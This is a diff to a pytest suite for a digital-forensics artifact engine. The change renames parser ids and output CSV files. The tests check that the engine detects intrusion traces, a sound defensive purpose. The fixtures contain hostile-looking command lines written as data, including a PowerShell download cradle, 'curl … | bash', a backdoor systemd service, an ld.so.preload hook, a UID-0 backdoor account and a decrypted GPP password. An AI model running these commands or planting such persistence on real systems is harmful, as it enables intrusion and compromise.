@@ -1944,7 +1957,7 @@ def test_handler_sessions_and_sockets(tmp_path):
                        handler="artifact_engine.handlers.lin_sessions:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "sessions.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_sessions.csv").read_text(encoding="utf-8")
     assert "socket,/dev/shm/.implant.sock,unix socket in world-writable temp dir,yes" in out
     assert "system_bus_socket" not in out                         # standard socket skipped
     assert "Elastic" not in out                                   # nested tmp not matched on prefix
@@ -1976,7 +1989,7 @@ def test_handler_known_hosts_lateral(tmp_path):
         "|1|cccc=|dddd= ssh-rsa AAAAB3Nz...\n", encoding="utf-8")
 
     lin_known_hosts.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "known_hosts.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_known_hosts.csv").read_text(encoding="utf-8")
     assert "root,\"host01.example.local,10.0.0.22\",\"ecdsa-sha2-nistp256,ssh-ed25519\",," in out  # deduped, keytypes collapsed
     assert "root,host02.example.local,ssh-rsa,@revoked," in out                  # marker captured
     assert "alice,(hashed),\"ssh-ed25519,ssh-rsa\",2 entries," in out      # hashed summarised per account
@@ -2005,7 +2018,7 @@ def test_handler_proc_anomalies(tmp_path):
     (proc / "hidden_pids_for_ps_command.txt").write_text("5000\n1011\n99999\n", encoding="utf-8")
 
     lin_proc_anomalies.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "process_anomalies.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "alert_process_anomalies.csv").read_text(encoding="utf-8")
     assert "exe_memfd,3456584,ds,/memfd:a (deleted),yes" in out
     assert "exe_tmp,5000,www-data,/tmp/.x/payload [hidden from ps],yes" in out  # anomaly + hidden enrichment
     assert "cwd_tmp,6000,www-data,/dev/shm/.s,yes" in out
@@ -2026,11 +2039,11 @@ def test_handler_log_integrity(tmp_path):
     (log / "wtmp").write_bytes(b"\x00" * 384 * 2)              # 2 records, aligned
     (log / "btmp").write_bytes(b"\x00" * 100)                  # truncated (not x384)
 
-    p = ParserManifest(id="log_integrity", requires=["[root]/var/log"],
+    p = ParserManifest(id="art_log_integrity", requires=["[root]/var/log"],
                        handler="artifact_engine.handlers.lin_log_integrity:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "log_integrity.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_log_integrity.csv").read_text(encoding="utf-8")
     assert "secure,empty,0 bytes,yes" in out
     assert "btmp,truncated,100 bytes (not a multiple of 384),yes" in out
     assert "wtmp,present,768 bytes (2 records)," in out
@@ -2056,11 +2069,11 @@ def test_handler_pkg_history_timeline_and_hacktools(tmp_path):
     (log / "dnf.rpm.log").write_text(
         "2026-01-04T13:00:00+0000 SUBDEBUG Installed: chisel-1.9.1.x86_64\n", encoding="utf-8")
 
-    p = ParserManifest(id="pkg_history", requires=["[root]/var/log"],
+    p = ParserManifest(id="art_log_pkg", requires=["[root]/var/log"],
                        handler="artifact_engine.handlers.lin_pkg_history:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "pkg_history.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_log_pkg.csv").read_text(encoding="utf-8")
     assert "2026-01-01 10:00:00,install,nmap,7.80,alice (1000),apt_history,yes" in out
     assert "install,libfoo,1.0,alice (1000),apt_history," in out   # benign, not flagged
     assert "2026-01-02 11:00:00,install,socat,1.7,,dpkg,yes" in out
@@ -2086,7 +2099,7 @@ def test_handler_users_enriches_groups_shadow(tmp_path):
     p = ParserManifest(id="users", handler="artifact_engine.handlers.lin_users:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "users.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_users.csv").read_text(encoding="utf-8")
     assert "backdoor,0,0,root,,/bin/bash,,,yes,,/root,yes" in out      # UID 0 non-root
     assert ("alice,1000,1000,,sudo,/bin/bash,locked,change forced at next login,yes,"
             "Alice,/home/alice,") in out
@@ -2117,7 +2130,7 @@ def test_handler_netconfig_flags_sinkhole_and_redirect(tmp_path):
     p = ParserManifest(id="netconfig", handler="artifact_engine.handlers.lin_netconfig:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "network_config.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_network_config.csv").read_text(encoding="utf-8")
     flagged = {ln.rsplit(",", 1)[0] for ln in out.splitlines() if ln.endswith(",yes")}
     assert "hosts,0.0.0.0 security.ubuntu.com,yes" in out      # sinkhole
     assert "hosts,1.2.3.4 update.example.com,yes" in out       # FQDN redirect
@@ -2147,7 +2160,7 @@ def test_without_a_hostname_only_debians_own_line_is_exempt(tmp_path):
         "127.0.0.1 web-03.example.local\n", encoding="utf-8")
     from artifact_engine.handlers import lin_netconfig
     lin_netconfig.run(_ctx(tmp_path, tmp_path / "CSVs"))
-    out = (tmp_path / "CSVs" / "network_config.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_network_config.csv").read_text(encoding="utf-8")
     flagged = {ln.rsplit(",", 1)[0] for ln in out.splitlines() if ln.endswith(",yes")}
     assert flagged == {"hosts,127.0.0.1 files-02.example.local files-02",
                        "hosts,127.0.1.1 mirror.example.com mirror",
@@ -2183,7 +2196,7 @@ def test_persistence_covers_service_account_homes(tmp_path):
 
     out = tmp_path / "CSVs"
     lin_persistence.run(_ctx(tmp_path, out))
-    text = (out / "persistence.csv").read_text(encoding="utf-8")
+    text = (out / "art_persistence.csv").read_text(encoding="utf-8")
     assert "var/www/.profile" in text and "198.51.100.9" in text
     assert text.splitlines()[1].endswith(",yes")     # flagged, and sorted first
 
@@ -2240,7 +2253,7 @@ def test_handler_persistence(tmp_path):
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
 
-    out = (tmp_path / "CSVs" / "persistence.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_persistence.csv").read_text(encoding="utf-8")
     assert "systemd_service,etc/systemd/system/evil.service,ExecStart=/tmp/.x/backdoor -c,yes" in out
     assert "ld_preload,etc/ld.so.preload,/dev/shm/hook.so,yes" in out
     assert "curl http://x/y | bash,yes" in out
@@ -2291,11 +2304,11 @@ def test_handler_web_access_parses_apache_nginx_and_gz(tmp_path):
     # error logs must NOT be picked up
     (ap / "error.log").write_text("nonsense not an access line\n", encoding="utf-8")
 
-    p = ParserManifest(id="web_access",
+    p = ParserManifest(id="art_web_access",
                        handler="artifact_engine.handlers.lin_web_access:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "web_access.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_web_access.csv").read_text(encoding="utf-8")
     lines = out.splitlines()
     assert lines[0].startswith("time,ip,edge_ip,method,status")
     assert len(lines) == 1 + 4                       # 4 access lines across 3 files
@@ -2497,7 +2510,7 @@ def test_handler_web_metrics_aggregates(tmp_path):
     (ap / "access.log").write_text(
         "\n".join([_BENIGN, *brute, *scan, *extra]) + "\n", encoding="utf-8")
 
-    p = ParserManifest(id="web_metrics",
+    p = ParserManifest(id="art_web_metrics",
                        handler="artifact_engine.handlers.lin_web_metrics:run")
     assert run_parser(p, _ctx(tmp_path, tmp_path / "CSVs")).status == "ok"
 
@@ -2603,10 +2616,10 @@ def test_handler_web_sigma_user_indicators_path_when_served_ua_at_any_status(tmp
 
     ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
                         assets=assets, machine_name="host", volume="live", log=None)
-    p = ParserManifest(id="web_sigma", handler="artifact_engine.handlers.lin_web_sigma:run")
+    p = ParserManifest(id="alert_web", handler="artifact_engine.handlers.lin_web_sigma:run")
     assert run_parser(p, ctx).status == "ok"
     import csv
-    with open(tmp_path / "CSVs" / "web_sigma.csv", encoding="utf-8", newline="") as fh:
+    with open(tmp_path / "CSVs" / "alert_web.csv", encoding="utf-8", newline="") as fh:
         rows = sorted((r["rule"], r["level"], r["ip"], r["status"], r["hits"],
                        r["first_seen"], r["last_seen"])
                       for r in csv.DictReader(fh) if r["rule"].startswith("web_suspicious"))
@@ -2710,9 +2723,9 @@ def test_handler_web_sigma_detects_attacks_aggregates_and_geo(tmp_path):
 
     ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
                         assets=tmp_path, machine_name="host", volume="live", log=None)
-    p = ParserManifest(id="web_sigma", handler="artifact_engine.handlers.lin_web_sigma:run")
+    p = ParserManifest(id="alert_web", handler="artifact_engine.handlers.lin_web_sigma:run")
     assert run_parser(p, ctx).status == "ok"
-    out = (tmp_path / "CSVs" / "web_sigma.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "alert_web.csv").read_text(encoding="utf-8")
     header = out.splitlines()[0]
     assert header.startswith("level,rule,mitre,hits,first_seen,last_seen,ip,country,origin,asn")
     # every webserver attack class detected
@@ -2734,9 +2747,9 @@ def test_handler_web_sigma_detects_attacks_aggregates_and_geo(tmp_path):
 
 def test_handler_web_sigma_no_logs_is_clean(tmp_path):
     (tmp_path / "[root]").mkdir()
-    p = ParserManifest(id="web_sigma", handler="artifact_engine.handlers.lin_web_sigma:run")
+    p = ParserManifest(id="alert_web", handler="artifact_engine.handlers.lin_web_sigma:run")
     assert run_parser(p, _ctx(tmp_path, tmp_path / "CSVs")).status == "skipped"
-    assert not (tmp_path / "CSVs" / "web_sigma.csv").exists()
+    assert not (tmp_path / "CSVs" / "alert_web.csv").exists()
 
 
 def test_is_hosting_classifier():
@@ -2753,7 +2766,7 @@ def test_is_hosting_classifier():
 
 def test_handler_auditd_config_skips_when_absent(tmp_path):
     (tmp_path / "[root]" / "etc").mkdir(parents=True)
-    p = ParserManifest(id="auditd_config",
+    p = ParserManifest(id="art_auditd_config",
                        handler="artifact_engine.handlers.lin_auditd_config:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "skipped"
@@ -2769,11 +2782,11 @@ def test_handler_auditd_config_default_posture_not_flagged(tmp_path):
         "write_logs = yes\nlog_file = /var/log/audit/audit.log\n"
         "max_log_file_action = ROTATE\n", encoding="utf-8")
 
-    p = ParserManifest(id="auditd_config",
+    p = ParserManifest(id="art_auditd_config",
                        handler="artifact_engine.handlers.lin_auditd_config:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "auditd_config.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_auditd_config.csv").read_text(encoding="utf-8")
     assert "no syscall auditing" in out
     assert "task,never=yes" in out
     assert ",yes" not in out                         # nothing flagged on a default box
@@ -2794,11 +2807,11 @@ def test_handler_auditd_config_flags_tampering(tmp_path):
         "write_logs = no\nlog_file = /tmp/aud.log\n"
         "max_log_file_action = ignore\n", encoding="utf-8")
 
-    p = ParserManifest(id="auditd_config",
+    p = ParserManifest(id="art_auditd_config",
                        handler="artifact_engine.handlers.lin_auditd_config:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
-    out = (tmp_path / "CSVs" / "auditd_config.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "CSVs" / "art_auditd_config.csv").read_text(encoding="utf-8")
     assert "coverage" in out and "enabled=-e0" in out
     out_lines = out.splitlines()
     # -e 0 in the loaded ruleset -> coverage flagged
@@ -2845,7 +2858,7 @@ def test_handler_win_yara_matches_and_skips_output(tmp_path):
     p = ParserManifest(id="yara", handler="artifact_engine.handlers.win_yara:run")
     r = run_parser(p, ctx)
     assert r.status == "ok"
-    out = (tmp_path / "out" / "yara.csv").read_text(encoding="utf-8")
+    out = (tmp_path / "out" / "alert_yara.csv").read_text(encoding="utf-8")
     assert "Users/bob/Downloads/evil.php" in out
     assert "ok.php" not in out              # benign spared
     assert "Cache" not in out               # cache subtree pruned
@@ -2872,7 +2885,7 @@ def test_handler_win_yara_skips_without_targets(tmp_path):
     except HandlerSkip:
         raised = True
     assert raised
-    assert not (tmp_path / "out" / "yara.csv").exists()
+    assert not (tmp_path / "out" / "alert_yara.csv").exists()
 
 
 # --------------------------------------------------------------------------- #
@@ -3129,7 +3142,7 @@ def test_handler_rmm_detects_from_amcache(tmp_path):
     ]}), encoding="utf-8")
     exe = tmp_path / "C" / "CSVs" / "Execution"
     exe.mkdir(parents=True)
-    with (exe / "amcache_AssociatedFileEntries.csv").open("w", encoding="utf-8", newline="") as fh:
+    with (exe / "art_amcache_associated_files.csv").open("w", encoding="utf-8", newline="") as fh:
         w = _csv.DictWriter(fh, fieldnames=["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp"])
         w.writeheader()
         w.writerow({"Name": "AnyDesk.exe", "FullPath": "C:\\Users\\x\\Downloads\\AnyDesk.exe",
@@ -3141,7 +3154,7 @@ def test_handler_rmm_detects_from_amcache(tmp_path):
     ctx = ParserContext(evidence=tmp_path / "C", out=tmp_path / "C" / "CSVs" / "Detections",
                         tools=tmp_path, assets=tmp_path / "assets", machine_name="h", volume="C", log=None)
     win_exec_hunt.run(ctx)
-    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "rmm.csv").open(encoding="utf-8")))
+    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "alert_rmm.csv").open(encoding="utf-8")))
     # Amcache FileKeyLastWriteTimestamp: EZ tools render UTC and this engine
     # passes no --dt offset, so the column declares `_utc`
     assert "first_seen_utc" in rows[0]
@@ -3180,7 +3193,7 @@ def test_handler_byovd_matches_amcache_sha1(tmp_path):
     }}), encoding="utf-8")
     exe = tmp_path / "C" / "CSVs" / "Execution"
     exe.mkdir(parents=True)
-    with (exe / "amcache_AssociatedFileEntries.csv").open("w", encoding="utf-8", newline="") as fh:
+    with (exe / "art_amcache_associated_files.csv").open("w", encoding="utf-8", newline="") as fh:
         w = _csv.DictWriter(fh, fieldnames=["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp"])
         w.writeheader()
         w.writerow({"Name": "svchost.sys", "FullPath": "C:\\Windows\\Temp\\svchost.sys",
@@ -3192,7 +3205,7 @@ def test_handler_byovd_matches_amcache_sha1(tmp_path):
     ctx = ParserContext(evidence=tmp_path / "C", out=tmp_path / "C" / "CSVs" / "Detections",
                         tools=tmp_path, assets=tmp_path / "assets", machine_name="h", volume="C", log=None)
     win_exec_hunt.run(ctx)
-    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "byovd.csv").open(encoding="utf-8")))
+    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "alert_byovd.csv").open(encoding="utf-8")))
     # Amcache FileKeyLastWriteTimestamp: EZ tools render UTC and this engine
     # passes no --dt offset, so the column declares `_utc`
     assert "first_seen_utc" in rows[0]
@@ -3214,7 +3227,7 @@ def test_handler_lolbas_flags_staging_relocation(tmp_path):
         _yaml.safe_dump({"binaries": ["certutil.exe", "mshta.exe"]}), encoding="utf-8")
     exe = tmp_path / "C" / "CSVs" / "Execution"
     exe.mkdir(parents=True)
-    with (exe / "amcache_AssociatedFileEntries.csv").open("w", encoding="utf-8", newline="") as fh:
+    with (exe / "art_amcache_associated_files.csv").open("w", encoding="utf-8", newline="") as fh:
         w = _csv.DictWriter(fh, fieldnames=["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp"])
         w.writeheader()
         w.writerow({"Name": "certutil.exe", "FullPath": "C:\\Users\\x\\AppData\\Local\\Temp\\certutil.exe",
@@ -3226,7 +3239,7 @@ def test_handler_lolbas_flags_staging_relocation(tmp_path):
     ctx = ParserContext(evidence=tmp_path / "C", out=tmp_path / "C" / "CSVs" / "Detections",
                         tools=tmp_path, assets=tmp_path / "assets", machine_name="h", volume="C", log=None)
     win_exec_hunt.run(ctx)
-    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "lolbas.csv").open(encoding="utf-8")))
+    rows = list(_csv.DictReader((tmp_path / "C" / "CSVs" / "Detections" / "alert_lolbas.csv").open(encoding="utf-8")))
     # Amcache FileKeyLastWriteTimestamp: EZ tools render UTC and this engine
     # passes no --dt offset, so the column declares `_utc`
     assert "first_seen_utc" in rows[0]
@@ -3350,7 +3363,7 @@ def test_handler_persistence_selfgates(tmp_path):
     from artifact_engine.handlers import win_persistence
     with pytest.raises(HandlerSkip):                        # no hives at all
         win_persistence.run(_ctx(tmp_path, tmp_path / "Detections"))
-    assert not (tmp_path / "Detections" / "persistence.csv").exists()
+    assert not (tmp_path / "Detections" / "art_reg_persistence.csv").exists()
 
 
 def test_handler_liveresponse_skips_without_results(tmp_path):
@@ -3448,7 +3461,7 @@ def test_detect_evtx_drop_and_stage_logs(tmp_path):
     assert (drop / "sub").is_dir()             # emptied dirs are kept, not pruned
     # the per-channel + whole-folder parsers now apply to the drop
     ids = {p.id for p in parsers_for(ms[0], load_parsers(cfg.all_parser_dirs))}
-    assert {"evtx_security", "evtx_system", "hayabusa"} <= ids
+    assert {"art_evtx_security", "art_evtx_system", "art_hayabusa"} <= ids
     assert "chainsaw_sigma" not in ids                 # removed in v0.7.161
     assert "deepblue" not in ids                # removed in v0.7.131
 
@@ -3498,7 +3511,7 @@ def test_evtx_drop_named_before_consolidation_so_outputs_agree(tmp_path):
     drop = tmp_path / "evtx-caso"
     logs = drop / "CSVs" / "EventLogs"
     logs.mkdir(parents=True)
-    with (logs / "evtx_security.csv").open("w", encoding="utf-8", newline="") as fh:
+    with (logs / "art_evtx_security.csv").open("w", encoding="utf-8", newline="") as fh:
         w = _csv.DictWriter(fh, fieldnames=["TimeCreated", "EventId", "Computer"])
         w.writeheader()
         for _ in range(3):
@@ -3507,7 +3520,7 @@ def test_evtx_drop_named_before_consolidation_so_outputs_agree(tmp_path):
     m = Machine("evtx-caso", "windows", "evtx", "evtx", drop, "evtx-caso",
                 [Volume("evtx-caso", drop, True)])
     assign_display_names([m])
-    runs = [ParserRun("evtx_security", "evtx-caso", "ok", 1.0)]
+    runs = [ParserRun("art_evtx_security", "evtx-caso", "ok", 1.0)]
 
     assert [x.name for x in name_evtx_drops([m])] == ["PCB"]   # renamed, and reported
     assign_display_names([m])
@@ -3576,7 +3589,7 @@ def test_iter_access_files_loose_drop(tmp_path):
         gzip.compress((_JETPACK + "\n").encode()))
     (tmp_path / "error.log").write_text(_BENIGN + "\n", encoding="utf-8")  # excluded (name)
     (tmp_path / "CSVs" / "Web").mkdir(parents=True)
-    (tmp_path / "CSVs" / "Web" / "web_access.csv").write_text("x")    # own output: excluded
+    (tmp_path / "CSVs" / "Web" / "art_web_access.csv").write_text("x")    # own output: excluded
     (tmp_path / "run.json").write_text("{}")                          # excluded
     (tmp_path / "logs_marzo.zip").write_bytes(b"PK")                  # container: extracted
     (tmp_path / "export.tar.gz").write_bytes(b"\x1f\x8b")             # aside, so excluded
@@ -3638,7 +3651,7 @@ def test_handler_fortigate_drop(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_fortigate.run(_ctx(tmp_path, out))
-    text = (out / "fortigate.csv").read_text(encoding="utf-8")
+    text = (out / "art_fortigate.csv").read_text(encoding="utf-8")
     lines = text.splitlines()
     assert len(lines) == 1 + 6                                  # header + 6 records (glued split)
     assert "2019-05-10 18:37:47,2019-05-10 11:37:47,,traffic,forward" in text  # ns epoch -> UTC
@@ -3694,7 +3707,7 @@ def test_handler_fortigate_csv_export(tmp_path):
 
     out = case / "CSVs"
     lin_fortigate.run(_ctx(case, out))
-    text = (out / "fortigate.csv").read_text(encoding="utf-8")
+    text = (out / "art_fortigate.csv").read_text(encoding="utf-8")
     lines = text.splitlines()
     assert len(lines) == 1 + 2
     # ns epoch -> UTC (18:00 local +0200 = 16:00 UTC); values un-quoted cleanly
@@ -3729,7 +3742,7 @@ def test_handler_web_access_loose_drop_end_to_end(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_web_access.run(_ctx(tmp_path, out))
-    text = (out / "web_access.csv").read_text(encoding="utf-8")
+    text = (out / "art_web_access.csv").read_text(encoding="utf-8")
     assert "2026-05-19 09:11:17 +0200,1.2.3.4,,GET,200,512,/index.php,id=1" in text  # empty edge_ip
     assert "not a clf line" not in text            # junk lines just don't match
 
@@ -3811,7 +3824,7 @@ def test_on_vss_false_skips_parser_on_snapshot_machines(tmp_path):
     from artifact_engine.config import load_config
     from artifact_engine.registry import load_parsers
     mft = next(p for p in load_parsers(load_config().all_parser_dirs)
-               if p.id == "mft_transcode")
+               if p.id == "art_mft")
     assert mft.on_vss is False
 
 
@@ -3886,7 +3899,7 @@ def test_handler_consolehost_history(tmp_path):
         encoding="utf-8")
     out = tmp_path / "CSVs"
     win_consolehost.run(_ctx(tmp_path, out))
-    text = (out / "consolehost.csv").read_text(encoding="utf-8")
+    text = (out / "art_consolehost.csv").read_text(encoding="utf-8")
     assert "1,alice,,Get-ChildItem C:\\Temp" in text
     assert "2,alice,download_cradle,iex (iwr http://10.0.0.9/p.ps1)" in text
     assert "3,alice,encoded_command," in text
@@ -3901,7 +3914,7 @@ def test_handler_consolehost_no_history_writes_nothing(tmp_path):
     (tmp_path / "Users" / "carol" / "Desktop").mkdir(parents=True)
     out = tmp_path / "CSVs"
     win_consolehost.run(_ctx(tmp_path, out))
-    assert not (out / "consolehost.csv").exists()
+    assert not (out / "art_consolehost.csv").exists()
 
 
 def test_handler_rdp_mru_scan_merges_default_and_servers():
@@ -3951,7 +3964,7 @@ def test_handler_sudo_log_parses_fields_denials_and_flags(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_sudo.run(_ctx(tmp_path, out))
-    text = (out / "sudo_log.csv").read_text(encoding="utf-8")
+    text = (out / "art_log_sudo.csv").read_text(encoding="utf-8")
     assert "2024-09-25 09:20:31,,alice,root,pts/0,/home/alice,,/bin/su - root," in text
     assert "2024-09-23 17:35:57,,svcacct,root,,/opt/agent,command not allowed,/usr/sbin/dmidecode," in text
     # COMMAND containing " ; " is not split into fields
@@ -3968,7 +3981,7 @@ def test_handler_sudo_log_absent_writes_nothing(tmp_path):
     (tmp_path / "[root]" / "var" / "log").mkdir(parents=True)
     out = tmp_path / "CSVs"
     lin_sudo.run(_ctx(tmp_path, out))
-    assert not (out / "sudo_log.csv").exists()
+    assert not (out / "art_log_sudo.csv").exists()
 
 
 def test_handler_cron_log_exec_and_crontab_changes(tmp_path):
@@ -3987,7 +4000,7 @@ def test_handler_cron_log_exec_and_crontab_changes(tmp_path):
     )
     out = tmp_path / "CSVs"
     lin_cron_log.run(_ctx(tmp_path, out))
-    text = (out / "cron_log.csv").read_text(encoding="utf-8")
+    text = (out / "art_log_cron.csv").read_text(encoding="utf-8")
     assert "exec,root,/opt/agent/run.sh >/dev/null 2>&1," in text
     assert "crontab_replace,www-data,www-data," in text
     assert "reload,www-data,/var/spool/cron/www-data," in text
@@ -4001,7 +4014,7 @@ def test_handler_cron_log_absent_writes_nothing(tmp_path):
     (tmp_path / "[root]" / "var" / "log").mkdir(parents=True)
     out = tmp_path / "CSVs"
     lin_cron_log.run(_ctx(tmp_path, out))
-    assert not (out / "cron_log.csv").exists()
+    assert not (out / "art_log_cron.csv").exists()
 
 
 _TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
@@ -4031,7 +4044,7 @@ def test_handler_tasks_disk_parses_and_flags(tmp_path):
     (tasks / "notxml").write_text("garbage", encoding="utf-8")   # tolerated, skipped
     out = tmp_path / "CSVs"
     win_tasks_disk.run(_ctx(tmp_path, out))
-    text = (out / "tasks_disk.csv").read_text(encoding="utf-8")
+    text = (out / "art_tasks.csv").read_text(encoding="utf-8")
     lines = text.splitlines()
     # RegistrationInfo/Date is stamped in the registering user's LOCAL zone and
     # passed through verbatim -> `_local`, so it is never read as UTC by mistake
@@ -4097,7 +4110,7 @@ def test_handler_rdp_mru_selfgates_and_skips_bad_hive(tmp_path):
     bad.mkdir(parents=True)
     (bad / "NTUSER.DAT").write_bytes(b"not a hive")
     win_rdp_mru.run(_ctx(tmp_path, out))                   # unreadable hive -> 0 rows
-    assert not (out / "rdp_outbound.csv").exists()
+    assert not (out / "art_reg_rdp_outbound.csv").exists()
 
 
 def test_handler_sysvol_gpp_and_scripts(tmp_path):
@@ -4144,13 +4157,13 @@ def test_handler_sysvol_gpp_and_scripts(tmp_path):
 
     win_sysvol.run(_ctx(tmp_path, out))
 
-    gpp = (out / "sysvol_gpp.csv").read_text(encoding="utf-8")
+    gpp = (out / "art_sysvol_gpp.csv").read_text(encoding="utf-8")
     assert "Local*P4ssword!" in gpp                         # cpassword decrypted
     assert "C:\\Users\\Public\\bt.exe -nop" in gpp        # GPP task command line
     # cpassword row, privileged-group add and staging-dir task are all suspicious
     assert gpp.count(",yes") == 3
 
-    scripts = (out / "sysvol_scripts.csv").read_text(encoding="utf-8")
+    scripts = (out / "art_sysvol_scripts.csv").read_text(encoding="utf-8")
     assert "ok.vbs" in scripts and "eviluser.hta" in scripts
     lines = [ln for ln in scripts.splitlines() if ".hta" in ln]
     assert lines and lines[0].endswith(",yes")             # temp-path .hta flagged
@@ -4160,7 +4173,7 @@ def test_sysvol_manifest_scoped_to_dc(tmp_path):
     """The shipped manifest requires SYSVOL (DC-only) and skips VSS snapshots."""
     from artifact_engine.config import load_config
     from artifact_engine.registry import load_parsers
-    p = next(x for x in load_parsers(load_config().all_parser_dirs) if x.id == "sysvol")
+    p = next(x for x in load_parsers(load_config().all_parser_dirs) if x.id == "art_sysvol")
     assert p.requires == ["Windows/SYSVOL"]
     assert p.on_vss is False
 
@@ -4200,7 +4213,7 @@ def test_handler_timeline_native(tmp_path):
 
     out = tmp_path / "CSVs"
     win_timeline.run(_ctx(tmp_path, out))
-    text = (out / "timeline.csv").read_text(encoding="utf-8")
+    text = (out / "art_win_timeline.csv").read_text(encoding="utf-8")
 
     # ActivitiesCache holds plain Unix epochs, rendered with tz=utc -> `_utc` header
     assert text.splitlines()[0] == \
@@ -4242,7 +4255,7 @@ def test_handler_bits_carves_jobs(tmp_path):
 
     out = tmp_path / "CSVs"
     win_bits.run(_ctx(tmp_path, out))
-    text = (out / "bits_jobs.csv").read_text(encoding="utf-8")
+    text = (out / "art_bits_jobs.csv").read_text(encoding="utf-8")
     lines = text.splitlines()
 
     assert any("203.0.113.9" in ln and ln.endswith(",yes") for ln in lines)  # raw-IP exe
@@ -4256,9 +4269,9 @@ def test_timeline_and_bits_manifests_native(tmp_path):
     from artifact_engine.config import load_config
     from artifact_engine.registry import load_parsers
     ps = {p.id: p for p in load_parsers(load_config().all_parser_dirs)}
-    assert ps["timeline"].tool is None and ps["timeline"].handler
-    assert ps["bits"].tool is None and ps["bits"].handler
-    assert ps["bits"].requires == ["ProgramData/Microsoft/Network/Downloader"]
+    assert ps["art_win_timeline"].tool is None and ps["art_win_timeline"].handler
+    assert ps["art_bits_jobs"].tool is None and ps["art_bits_jobs"].handler
+    assert ps["art_bits_jobs"].requires == ["ProgramData/Microsoft/Network/Downloader"]
 
 
 def test_auth_streams_rotations_in_order_with_a_bounded_dedupe(tmp_path, monkeypatch):
@@ -4290,7 +4303,7 @@ def test_auth_streams_rotations_in_order_with_a_bounded_dedupe(tmp_path, monkeyp
 
     out = tmp_path / "CSVs"
     lin_auth.run(_ctx(tmp_path, out))
-    body = (out / "auth_log.csv").read_text(encoding="utf-8").splitlines()[1:]
+    body = (out / "art_log_auth.csv").read_text(encoding="utf-8").splitlines()[1:]
 
     sources = [r.split(",")[5] for r in body]
     assert sources == ["1.2.3.4", "5.6.7.8", "9.10.11.12", "13.14.15.16",
@@ -4301,7 +4314,7 @@ def test_auth_streams_rotations_in_order_with_a_bounded_dedupe(tmp_path, monkeyp
     monkeypatch.setattr(lin_auth, "_DEDUPE_WINDOW", 1)
     out2 = tmp_path / "CSVs2"
     lin_auth.run(_ctx(tmp_path, out2))
-    body2 = (out2 / "auth_log.csv").read_text(encoding="utf-8").splitlines()[1:]
+    body2 = (out2 / "art_log_auth.csv").read_text(encoding="utf-8").splitlines()[1:]
     assert len(body2) == 7
 
 
@@ -4318,7 +4331,7 @@ def test_cron_log_streams_and_reads_rotations_oldest_first(tmp_path):
 
     out = tmp_path / "CSVs"
     lin_cron_log.run(_ctx(tmp_path, out))
-    body = (out / "cron_log.csv").read_text(encoding="utf-8").splitlines()[1:]
+    body = (out / "art_log_cron.csv").read_text(encoding="utf-8").splitlines()[1:]
     assert [r.split(",")[4] for r in body] == ["/oldest.sh", "/middle.sh", "/newest.sh"]
 
 
@@ -4357,7 +4370,7 @@ def test_utmp_is_streamed_not_read_whole(tmp_path):
                                         for i in range(n)))
     out = tmp_path / "CSVs"
     lin_logins.run(_ctx(tmp_path, out))
-    body = (out / "logins.csv").read_text(encoding="utf-8").splitlines()
+    body = (out / "art_logins.csv").read_text(encoding="utf-8").splitlines()
     assert len(body) == n + 1                      # header + every record, none lost
     assert body[1] == ("2026-05-28 20:26:40,,,failed,USER_PROCESS,root,pts0,203.0.113.5,"
                        "btmp," + str(Path("[root]/var/log/btmp")))
@@ -4437,7 +4450,7 @@ def test_delimiter_detection_is_not_fooled_by_a_hostile_cell(tmp_path):
     file existence still look right."""
     from artifact_engine.core.consolidate import _read_csv
 
